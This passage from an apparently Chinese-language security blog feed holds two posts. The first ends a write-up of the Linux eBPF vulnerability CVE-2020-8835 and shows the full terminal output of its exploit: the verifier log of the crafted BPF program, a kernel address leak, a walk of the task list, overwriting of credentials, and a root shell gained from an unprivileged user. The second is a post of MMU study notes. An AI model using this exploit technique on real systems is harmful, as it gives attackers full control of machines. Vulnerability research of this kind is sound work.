class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br></pre></td><td class="code"><pre><span class="line">pwnht@syzkaller:~/cve-2020-8835$ whoami</span><br><span class="line">pwnht</span><br><span class="line">pwnht@syzkaller:~/cve-2020-8835$ ls -l</span><br><span class="line">total 68</span><br><span class="line">-rwxr-xr-x. 1 pwnht pwnht 23680 Apr 28 09:01 exp</span><br><span class="line">-rw-r--r--. 1 root  root  16902 Apr 28 09:00 exp.c</span><br><span class="line">-rwxr-xr-x. 1 pwnht pwnht 13824 Apr 13 06:34 exp1</span><br><span class="line">-rwxrwxrwx. 1 root  root   6632 Apr 24 07:29 poc.c</span><br><span class="line">pwnht@syzkaller:~/cve-2020-8835$ ./exp</span><br><span class="line">cmd_fd=3</span><br><span class="line">input_fd=4</span><br><span class="line">output_fd=5</span><br><span class="line">progfd=6</span><br><span class="line">0: (b7) r6 = 0</span><br><span class="line">1: (7b) *(u64 *)(r10 -8) = r6</span><br><span class="line">2: (bf) r2 = r10</span><br><span class="line">3: (07) r2 += -8</span><br><span class="line">4: (18) r1 = 0x0</span><br><span class="line">6: (85) call bpf_map_lookup_elem#1</span><br><span class="line">7: (55) if r0 != 0x0 goto pc+1</span><br><span class="line"> R0_w=invP0 R6_w=invP0 R10=fp0 fp-8_w=0000mmmm</span><br><span class="line">8: (95) exit</span><br><span class="line"></span><br><span class="line">from 7 to 9: R0=map_value(id=0,off=0,ks=4,vs=16,imm=0) R6=invP0 R10=fp0 fp-8=0000mmmm</span><br><span class="line">9: (79) r6 = *(u64 *)(r0 +0)</span><br><span class="line"> R0=map_value(id=0,off=0,ks=4,vs=16,imm=0) R6_w=invP0 R10=fp0 fp-8=0000mmmm</span><br><span class="line">10: (79) r9 = *(u64 *)(r0 +8)</span><br><span class="line"> R0=map_value(id=0,off=0,ks=4,vs=16,imm=0) R6_w=invP(id=0) R10=fp0 fp-8=0000mmmm</span><br><span class="line">11: (55) if r9 != 0x0 goto pc+2</span><br><span class="line"> R0=map_value(id=0,off=0,ks=4,vs=16,imm=0) R6_w=invP(id=0) R9_w=invP0 R10=fp0 fp-8=0000mmmm</span><br><span class="line">12: (b7) r0 = 0</span><br><span class="line">13: (95) exit</span><br><span class="line"></span><br><span class="line">from 11 to 14: R0=map_value(id=0,off=0,ks=4,vs=16,imm=0) R6_w=invP(id=0) R9_w=invP(id=0) R10=fp0 fp-8=0000mmmm</span><br><span class="line">14: (b7) r0 = 0</span><br><span class="line">15: (35) if r6 &gt;= 0x1 goto pc+1</span><br><span class="line"> R0_w=invP0 R6_w=invP0 R9_w=invP(id=0) R10=fp0 fp-8=0000mmmm</span><br><span class="line">16: (95) exit</span><br><span class="line"></span><br><span class="line">from 15 to 17: R0=invP0 R6=invP(id=0,umin_value=1) R9=invP(id=0) R10=fp0 fp-8=0000mmmm</span><br><span class="line">17: (b7) r8 = 1</span><br><span class="line">18: (67) r8 &lt;&lt;= 32</span><br><span class="line">19: (07) r8 += 1</span><br><span class="line">20: (bd) if r6 &lt;= r8 goto pc+1</span><br><span class="line"> R0=invP0 R6=invP(id=0,umin_value=4294967298) R8_w=invP4294967297 R9=invP(id=0) R10=fp0 fp-8=0000mmmm</span><br><span class="line">21: (95) exit</span><br><span class="line"></span><br><span class="line">from 20 to 22: R0=invP0 R6=invP(id=0,umin_value=1,umax_value=4294967297,var_off=(0x0; 0x1ffffffff)) R8_w=invP4294967297 R9=invP(id=0) R10=fp0 fp-8=0000mmmm</span><br><span class="line">22: (56) if w6 != 0x0 goto pc+1</span><br><span class="line"> R0=invP0 R6=invP(id=0,umin_value=1,umax_value=4294967297,var_off=(0x1; 0x100000000)) R8_w=invP4294967297 R9=invP(id=0) R10=fp0 fp-8=0000mmmm</span><br><span class="line">23: (95) exit</span><br><span class="line"></span><br><span class="line">from 22 to 24: R0=invP0 R6=invP(id=0,umin_value=1,umax_value=4294967297,var_off=(0x1; 0x100000000)) R8_w=invP4294967297 R9=invP(id=0) R10=fp0 fp-8=0000mmmm</span><br><span class="line">24: (57) r6 &amp;= 2</span><br><span class="line">25: (74) w6 &gt;&gt;= 1</span><br><span class="line">26: (24) w6 *= 400</span><br><span class="line">27: (b7) r7 = 0</span><br><span class="line">28: (7b) *(u64 *)(r10 -8) = r7</span><br><span class="line">29: (bf) r2 = r10</span><br><span class="line">30: (07) r2 += -8</span><br><span class="line">31: (18) r1 = 0x0</span><br><span class="line">33: (85) call bpf_map_lookup_elem#1</span><br><span class="line">34: (55) if r0 != 0x0 goto pc+1</span><br><span class="line"> R0=invP0 R6=invP0 R7=invP0 R8=invP4294967297 R9=invP(id=0) R10=fp0 fp-8=0000mmmm</span><br><span class="line">35: (95) exit</span><br><span class="line"></span><br><span class="line">from 34 to 36: R0=map_value(id=0,off=0,ks=4,vs=4096,imm=0) R6=invP0 R7=invP0 R8=invP4294967297 R9=invP(id=0) R10=fp0 fp-8=0000mmmm</span><br><span class="line">36: (bf) r8 = r0</span><br><span class="line">37: (b7) r0 = 0</span><br><span class="line">38: (1f) r8 -= r6</span><br><span class="line"> R0_w=invP0 R6=invP0 R7=invP0 R8_w=map_value(id=0,off=0,ks=4,vs=4096,imm=0) R9=invP(id=0) R10=fp0 fp-8=0000mmmm</span><br><span class="line">39: (b7) r7 = 0</span><br><span class="line">40: (7b) *(u64 *)(r10 -8) = r7</span><br><span class="line">41: (bf) r2 = r10</span><br><span class="line">42: (07) r2 += -8</span><br><span class="line">43: (18) r1 = 0x0</span><br><span class="line">45: (85) call bpf_map_lookup_elem#1</span><br><span class="line">46: (55) if r0 != 0x0 goto pc+1</span><br><span class="line"> R0=invP0 R6=invP0 R7=invP0 R8=map_value(id=0,off=0,ks=4,vs=4096,imm=0) R9=invP(id=0) R10=fp0 fp-8=0000mmmm</span><br><span class="line">47: (95) exit</span><br><span class="line"></span><br><span class="line">from 46 to 48: R0=map_value(id=0,off=0,ks=4,vs=4096,imm=0) R6=invP0 R7=invP0 R8=map_value(id=0,off=0,ks=4,vs=4096,imm=0) R9=invP(id=0) R10=fp0 fp-8=0000mmmm</span><br><span class="line">48: (bf) r7 = r0</span><br><span class="line">49: (55) if r9 != 0x1 goto pc+6</span><br><span class="line"> R0=map_value(id=0,off=0,ks=4,vs=4096,imm=0) R6=invP0 R7_w=map_value(id=0,off=0,ks=4,vs=4096,imm=0) R8=map_value(id=0,off=0,ks=4,vs=4096,imm=0) R9=invP1 R10=fp0 fp-8=0000mmmm</span><br><span class="line">50: (79) r9 = *(u64 *)(r8 +0)</span><br><span class="line"> R0=map_value(id=0,off=0,ks=4,vs=4096,imm=0) R6=invP0 R7_w=map_value(id=0,off=0,ks=4,vs=4096,imm=0) R8=map_value(id=0,off=0,ks=4,vs=4096,imm=0) R9_w=invP1 R10=fp0 fp-8=0000mmmm</span><br><span class="line">51: (7b) *(u64 *)(r7 +0) = r9</span><br><span class="line"> R0=map_value(id=0,off=0,ks=4,vs=4096,imm=0) R6=invP0 R7_w=map_value(id=0,off=0,ks=4,vs=4096,imm=0) R8=map_value(id=0,off=0,ks=4,vs=4096,imm=0) R9_w=invP(id=0) R10=fp0 fp-8=0000mmmm</span><br><span class="line">52: (79) r9 = *(u64 *)(r8 +288)</span><br><span class="line"> R0=map_value(id=0,off=0,ks=4,vs=4096,imm=0) R6=invP0 R7_w=map_value(id=0,off=0,ks=4,vs=4096,imm=0) R8=map_value(id=0,off=0,ks=4,vs=4096,imm=0) R9_w=invP(id=0) R10=fp0 fp-8=0000mmmm</span><br><span class="line">53: (7b) *(u64 *)(r7 +8) = r9</span><br><span class="line"> R0=map_value(id=0,off=0,ks=4,vs=4096,imm=0) R6=invP0 R7_w=map_value(id=0,off=0,ks=4,vs=4096,imm=0) R8=map_value(id=0,off=0,ks=4,vs=4096,imm=0) R9_w=invP(id=0) R10=fp0 fp-8=0000mmmm</span><br><span class="line">54: (b7) r0 = 0</span><br><span class="line">55: (95) exit</span><br><span class="line"></span><br><span class="line">from 49 to 56: R0=map_value(id=0,off=0,ks=4,vs=4096,imm=0) R6=invP0 R7=map_value(id=0,off=0,ks=4,vs=4096,imm=0) R8=map_value(id=0,off=0,ks=4,vs=4096,imm=0) R9=invP(id=0) R10=fp0 fp-8=0000mmmm</span><br><span class="line">56: (55) if r9 != 0x3 goto pc+7</span><br><span class="line"> R0=map_value(id=0,off=0,ks=4,vs=4096,imm=0) R6=invP0 R7=map_value(id=0,off=0,ks=4,vs=4096,imm=0) R8=map_value(id=0,off=0,ks=4,vs=4096,imm=0) R9=invP3 R10=fp0 fp-8=0000mmmm</span><br><span class="line">57: (79) r4 = *(u64 *)(r7 +0)</span><br><span class="line"> R0=map_value(id=0,off=0,ks=4,vs=4096,imm=0) R6=invP0 R7=map_value(id=0,off=0,ks=4,vs=4096,imm=0) R8=map_value(id=0,off=0,ks=4,vs=4096,imm=0) R9=invP3 R10=fp0 fp-8=0000mmmm</span><br><span class="line">58: (7b) *(u64 *)(r8 +0) = r4</span><br><span class="line"> R0=map_value(id=0,off=0,ks=4,vs=4096,imm=0) R4_w=invP(id=0) R6=invP0 R7=map_value(id=0,off=0,ks=4,vs=4096,imm=0) R8=map_value(id=0,off=0,ks=4,vs=4096,imm=0) R9=invP3 R10=fp0 fp-8=0000mmmm</span><br><span class="line">59: (62) *(u32 *)(r8 +24) = 23</span><br><span class="line"> R0=map_value(id=0,off=0,ks=4,vs=4096,imm=0) R4_w=invP(id=0) R6=invP0 R7=map_value(id=0,off=0,ks=4,vs=4096,imm=0) R8=map_value(id=0,off=0,ks=4,vs=4096,imm=0) R9=invP3 R10=fp0 fp-8=0000mmmm</span><br><span class="line">60: (62) *(u32 *)(r8 +36) = -1</span><br><span class="line"> R0=map_value(id=0,off=0,ks=4,vs=4096,imm=0) R4_w=invP(id=0) R6=invP0 R7=map_value(id=0,off=0,ks=4,vs=4096,imm=0) R8=map_value(id=0,off=0,ks=4,vs=4096,imm=0) R9=invP3 R10=fp0 fp-8=0000mmmm</span><br><span class="line">61: (62) *(u32 *)(r8 +44) = 0</span><br><span class="line"> R0=map_value(id=0,off=0,ks=4,vs=4096,imm=0) R4_w=invP(id=0) R6=invP0 R7=map_value(id=0,off=0,ks=4,vs=4096,imm=0) R8=map_value(id=0,off=0,ks=4,vs=4096,imm=0) R9=invP3 R10=fp0 fp-8=0000mmmm</span><br><span class="line">62: (b7) r0 = 0</span><br><span class="line">63: (95) exit</span><br><span class="line"></span><br><span class="line">from 56 to 64: R0=map_value(id=0,off=0,ks=4,vs=4096,imm=0) R6=invP0 R7=map_value(id=0,off=0,ks=4,vs=4096,imm=0) R8=map_value(id=0,off=0,ks=4,vs=4096,imm=0) R9=invP(id=0) R10=fp0 fp-8=0000mmmm</span><br><span class="line">64: (79) r4 = *(u64 *)(r7 +0)</span><br><span class="line"> R0=map_value(id=0,off=0,ks=4,vs=4096,imm=0) R6=invP0 R7=map_value(id=0,off=0,ks=4,vs=4096,imm=0) R8=map_value(id=0,off=0,ks=4,vs=4096,imm=0) R9=invP(id=0) R10=fp0 fp-8=0000mmmm</span><br><span class="line">65: (7b) *(u64 *)(r8 +64) = r4</span><br><span class="line"> R0=map_value(id=0,off=0,ks=4,vs=4096,imm=0) R4_w=invP(id=0) R6=invP0 R7=map_value(id=0,off=0,ks=4,vs=4096,imm=0) R8=map_value(id=0,off=0,ks=4,vs=4096,imm=0) R9=invP(id=0) R10=fp0 fp-8=0000mmmm</span><br><span class="line">66: (b7) r0 = 0</span><br><span class="line">67: (95) exit</span><br><span class="line"></span><br><span class="line">from 38 to 39 (speculative execution): R0_w=invP0 R6=invP0 R7=invP0 R8_w=map_value(id=0,off=0,ks=4,vs=4096,imm=0) R9=invP(id=0) R10=fp0 fp-8=0000mmmm</span><br><span class="line">39: (b7) r7 = 0</span><br><span class="line">40: (7b) *(u64 *)(r10 -8) = r7</span><br><span class="line">41: (bf) r2 = r10</span><br><span class="line">42: (07) r2 += -8</span><br><span class="line">43: (18) r1 = 0x0</span><br><span class="line">45: (85) call bpf_map_lookup_elem#1</span><br><span class="line">46: safe</span><br><span class="line">processed 72 insns (limit 1000000) max_states_per_insn 0 total_states 6 peak_states 6 mark_read 3</span><br><span class="line"></span><br><span class="line">[*] creating socketpair()</span><br><span class="line">[*] attaching bpf backdoor to socket</span><br><span class="line">current pid=950</span><br><span class="line">bpf_arrary_ops=0xffffffff840bcc60</span><br><span class="line">kaslr=0x0</span><br><span class="line">input_map_value_address=0xffff888064704190</span><br><span class="line"></span><br><span class="line">tmp_task_address=0xffff88806c950000</span><br><span class="line">tmp_pid=1</span><br><span class="line">good get pid address</span><br><span class="line">pid 1 taskaddress=0xffff88806c950000</span><br><span class="line">pid 1 cred address=0xffff8880696dc600</span><br><span class="line">pid 1 nsproxy address=0xffffffff84adaac0</span><br><span class="line">found pid=2 at 0xffff88806c951740</span><br><span class="line">found pid=3 at 0xffff88806c952e80</span><br><span class="line">found pid=4 at 0xffff88806c9545c0</span><br><span class="line">found pid=5 at 0xffff88806c955d00</span><br><span class="line">found pid=6 at 0xffff88806c998000</span><br><span class="line">found pid=7 at 0xffff88806c999740</span><br><span class="line">found pid=8 at 0xffff88806c99ae80</span><br><span class="line">found pid=9 at 0xffff88806c99c5c0</span><br><span class="line">found pid=10 at 0xffff88806c99dd00</span><br><span class="line">found pid=11 at 0xffff88806c9d0000</span><br><span class="line">found pid=12 at 0xffff88806c9d1740</span><br><span class="line">found pid=13 at 0xffff88806c9d45c0</span><br><span class="line">found pid=14 at 0xffff88806c9d5d00</span><br><span class="line">found pid=15 at 0xffff88806ca08000</span><br><span class="line">found pid=16 at 0xffff88806ca09740</span><br><span class="line">found pid=17 at 0xffff88806ca0ae80</span><br><span class="line">found pid=18 at 0xffff88806ca0c5c0</span><br><span class="line">found pid=19 at 0xffff88806ca0dd00</span><br><span class="line">found pid=20 at 0xffff88806caa0000</span><br><span class="line">found pid=21 at 0xffff88806caa1740</span><br><span class="line">found pid=22 at 0xffff88806caa2e80</span><br><span class="line">found pid=23 at 0xffff88806caa45c0</span><br><span class="line">found pid=24 at 0xffff88806caa5d00</span><br><span class="line">found pid=25 at 0xffff88806c3b8000</span><br><span class="line">found pid=27 at 0xffff88806c3bae80</span><br><span class="line">found pid=71 at 0xffff88806bc90000</span><br><span class="line">found pid=72 at 0xffff88806bc91740</span><br><span class="line">found pid=73 at 0xffff88806bc92e80</span><br><span class="line">found pid=74 at 0xffff88806bc945c0</span><br><span class="line">found pid=75 at 0xffff88806bc95d00</span><br><span class="line">found pid=76 at 0xffff88806ae80000</span><br><span class="line">found pid=77 at 0xffff88806ae81740</span><br><span class="line">found pid=78 at 0xffff88806ae82e80</span><br><span class="line">found pid=79 at 0xffff88806ae845c0</span><br><span class="line">found pid=80 at 0xffff88806ae85d00</span><br><span class="line">found pid=81 at 0xffff88806aa20000</span><br><span class="line">found pid=84 at 0xffff88806aa22e80</span><br><span class="line">found pid=85 at 0xffff88806aa245c0</span><br><span class="line">found pid=86 at 0xffff88806aa25d00</span><br><span class="line">found pid=87 at 0xffff88806a6f0000</span><br><span class="line">found pid=88 at 0xffff88806a6f1740</span><br><span class="line">found pid=89 at 0xffff88806a6f2e80</span><br><span class="line">found pid=90 at 0xffff88806a6f45c0</span><br><span class="line">found pid=91 at 0xffff88806a6f5d00</span><br><span class="line">found pid=92 at 0xffff88806a220000</span><br><span class="line">found pid=93 at 0xffff88806a221740</span><br><span class="line">found pid=99 at 0xffff88806a225d00</span><br><span class="line">found pid=100 at 0xffff888068e40000</span><br><span class="line">found pid=101 at 0xffff888068e41740</span><br><span class="line">found pid=120 at 0xffff8880661d0000</span><br><span class="line">found pid=125 at 0xffff8880662c5d00</span><br><span class="line">found pid=139 at 0xffff88806bc2dd00</span><br><span class="line">found pid=147 at 0xffff88806a2245c0</span><br><span class="line">found pid=151 at 0xffff88806c3ddd00</span><br><span class="line">found pid=194 at 0xffff888066788000</span><br><span class="line">found pid=230 at 0xffff8880662c0000</span><br><span class="line">found pid=236 at 0xffff8880662c1740</span><br><span class="line">found pid=240 at 0xffff888067350000</span><br><span class="line">found pid=243 at 0xffff8880673545c0</span><br><span class="line">found pid=275 at 0xffff888069b8dd00</span><br><span class="line">found pid=330 at 0xffff88806a339740</span><br><span class="line">found pid=331 at 0xffff888065629740</span><br><span class="line">found pid=332 at 0xffff88806a33ae80</span><br><span class="line">found pid=720 at 0xffff888064a49740</span><br><span class="line">found pid=724 at 0xffff888063fa1740</span><br><span class="line">found pid=732 at 0xffff8880699f2e80</span><br><span class="line">found pid=735 at 0xffff8880699f1740</span><br><span class="line">found pid=739 at 0xffff888069ab1740</span><br><span class="line">found pid=745 at 0xffff8880664845c0</span><br><span class="line">found pid=789 at 0xffff888063e31740</span><br><span class="line">found pid=790 at 0xffff888065461740</span><br><span class="line">found pid=950 at 0xffff8880654645c0</span><br><span class="line">found !!!</span><br><span class="line">own_task address at 0xffff8880654645c0</span><br><span class="line">own task cred address at 0xffff888065464c28</span><br><span class="line">own task nsproxy address at 0xffff888065464c88</span><br><span class="line"></span><br><span class="line">pid 1 cred usage=1</span><br><span class="line">write cred success</span><br><span class="line">pid 1 nsproxy usage=80</span><br><span class="line">write ns success</span><br><span class="line">got root</span><br><span class="line">root@syzkaller:~/cve-2020-8835# whoami </span><br><span class="line">root</span><br><span class="line">root@syzkaller:~/cve-2020-8835#</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      这里主要分析一下bpf的模块的流程，及cve-2020-8835的poc的编写
    
    </summary>
    
    
    
      <category term="linux kernel,bpf" scheme="http://yoursite.com/tags/linux-kernel-bpf/"/>
    
  </entry>
  
  <entry>
    <title>mmu详解</title>
    <link href="http://yoursite.com/2020/04/12/mmu%E8%AF%A6%E8%A7%A3/"/>
    <id>http://yoursite.com/2020/04/12/mmu详解/</id>
    <published>2020-04-12T09:12:57.000Z</published>
    <updated>2020-05-24T14:57:12.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>前几天暑假实习面试，虽然事前准备了mmu但是还是面崩了，归根到底就是没有理解其原理，一些设置的必要之处，只是在理论上学习了，一些实现并不清楚，记录一下没有回答出来的问题。</p><h1 id="0x01-全局描述符表"><a href="#0x01-全局描述符表" class="headerlink" title="0x01 全局描述符表"></a>0x01 全局描述符表</h1><p>在整个系统中，全局描述表GDT只有一张，然后，如果有多个cpu的话，就每个cpu对应一个GDT，然后有个寄存器GDTR来保存GDT的基地址</p><h1 id="0x02-局部描述符"><a href="#0x02-局部描述符" class="headerlink" title="0x02 局部描述符"></a>0x02 局部描述符</h1><p>每个cpu可以有多个局部描述符LDT，每个LDT都对应一个进程，一般LDT并不是全局可见的，有个一个专门的LDTR寄存器来储存当前进程的LDT的值</p><h1 id="0x03-虚拟地址vs线性地址"><a href="#0x03-虚拟地址vs线性地址" class="headerlink" title="0x03 虚拟地址vs线性地址"></a>0x03 虚拟地址vs线性地址</h1><p>之前一直以为线性地址和虚拟地址是一个概念，虚拟地址的格式为[段寄存器:偏移量]，通过段寄存器，在GDT或者LDT找到某一表项，LDT或者GDT的表项存着线性地址的基地址，偏移量+线性地址的基地址就是线性地址了。（由于linux的线性基地址均为0，所以，很容易混淆。。。。。）</p><h1 id="0x04-CR3寄存器"><a href="#0x04-CR3寄存器" class="headerlink" title="0x04 CR3寄存器"></a>0x04 CR3寄存器</h1><p>我们都知道linux是三级分页机制，每个进程都有自己的页面目录指针PGD定义于mm_struct，PGD指向页面目录的物理地址，寄存器CR3用于存放当前进程正在使用的页目录基地址，所以，当访问内存的时候，内核就会把CR3寄存器的值改成当前进程的PGD指向的物理地址</p><h1 id="0x05-当我访问虚拟地址的时候，怎么定位到物理地址"><a href="#0x05-当我访问虚拟地址的时候，怎么定位到物理地址" class="headerlink" title="0x05 当我访问虚拟地址的时候，怎么定位到物理地址"></a>0x05 当我访问虚拟地址的时候，怎么定位到物理地址</h1><p>首先会根据虚拟地址算出线性地址（还是自己），然后，把cr3的值赋值成当前PGD的值，内核（<del>转换成实时模式</del>)，根据三级页表定位到真正的物理地址页,那么问题来了，如果访问的虚拟地址不存在物理映射怎么办呢，没有物理映射有以下几种情况</p><ul><li>访问的虚拟地址没有没有虚拟映射</li><li>访问的虚拟地址有虚拟映射但是没有物理映射（就是mmap了之后没有访问过）</li></ul><p>其实在虚拟是否被mmap取决的task_struct中的mm_struct中的vm_area_struct</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> * This struct defines a memory VMM memory area. There is one of these</span><br><span class="line"> * per VM-area/task.  A VM area is any part of the process virtual memory</span><br><span class="line"> * space that has a special rule for the page-fault handlers (ie a shared</span><br><span class="line"> * library, the executable area etc).</span><br><span class="line"> */</span><br><span class="line">struct vm_area_struct &#123;</span><br><span class="line">/* The first cache line has the info for VMA tree walking. */</span><br><span class="line"></span><br><span class="line">unsigned long vm_start;/* Our start address within vm_mm. */</span><br><span class="line">unsigned long vm_end;/* The first byte after our end address</span><br><span class="line">   within vm_mm. */</span><br><span class="line"></span><br><span class="line">/* linked list of VM areas per task, sorted by address */</span><br><span class="line">struct vm_area_struct *vm_next, *vm_prev;</span><br><span class="line"></span><br><span class="line">struct rb_node vm_rb;</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"> * Largest free memory gap in bytes to the left of this VMA.</span><br><span class="line"> * Either between this VMA and vma-&gt;vm_prev, or between one of the</span><br><span class="line"> * VMAs below us in the VMA rbtree and its -&gt;vm_prev. This helps</span><br><span class="line"> * get_unmapped_area find a free area of the right size.</span><br><span class="line"> */</span><br><span class="line">unsigned long rb_subtree_gap;</span><br><span class="line"></span><br><span class="line">/* Second cache line starts here. */</span><br><span class="line"></span><br><span class="line">struct mm_struct *vm_mm;/* The address space we belong to. */</span><br><span class="line">pgprot_t vm_page_prot;/* Access permissions of this VMA. */</span><br><span class="line">unsigned long vm_flags;/* Flags, see mm.h. */</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"> * For areas with an address space and backing store,</span><br><span class="line"> * linkage into the address_space-&gt;i_mmap interval tree.</span><br><span class="line"> */</span><br><span class="line">struct &#123;</span><br><span class="line">struct rb_node rb;</span><br><span class="line">unsigned long rb_subtree_last;</span><br><span class="line">&#125; shared;</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"> * A file&apos;s MAP_PRIVATE vma can be in both i_mmap tree and anon_vma</span><br><span class="line"> * list, after a COW of one of the file pages.A MAP_SHARED vma</span><br><span class="line"> * can only be in the i_mmap tree.  An anonymous MAP_PRIVATE, stack</span><br><span class="line"> * or brk vma (with NULL file) can only be in an anon_vma list.</span><br><span class="line"> */</span><br><span class="line">struct list_head anon_vma_chain; /* Serialized by mmap_sem &amp;</span><br><span class="line">  * page_table_lock */</span><br><span class="line">struct anon_vma *anon_vma;/* Serialized by page_table_lock */</span><br><span class="line"></span><br><span class="line">/* Function pointers to deal with this struct. */</span><br><span class="line">const struct vm_operations_struct *vm_ops;</span><br><span class="line"></span><br><span class="line">/* Information about our backing store: */</span><br><span class="line">unsigned long vm_pgoff;/* Offset (within vm_file) in PAGE_SIZE</span><br><span class="line">   units */</span><br><span class="line">struct file * vm_file;/* File we map to (can be NULL). */</span><br><span class="line">void * vm_private_data;/* was vm_pte (shared mem) */</span><br><span class="line"></span><br><span class="line">#ifdef CONFIG_SWAP</span><br><span class="line">atomic_long_t swap_readahead_info;</span><br><span class="line">#endif</span><br><span class="line">#ifndef CONFIG_MMU</span><br><span class="line">struct vm_region *vm_region;/* NOMMU mapping region */</span><br><span class="line">#endif</span><br><span class="line">#ifdef CONFIG_NUMA</span><br><span class="line">struct mempolicy *vm_policy;/* NUMA policy for the VMA */</span><br><span class="line">#endif</span><br><span class="line">struct vm_userfaultfd_ctx vm_userfaultfd_ctx;</span><br><span class="line">&#125; 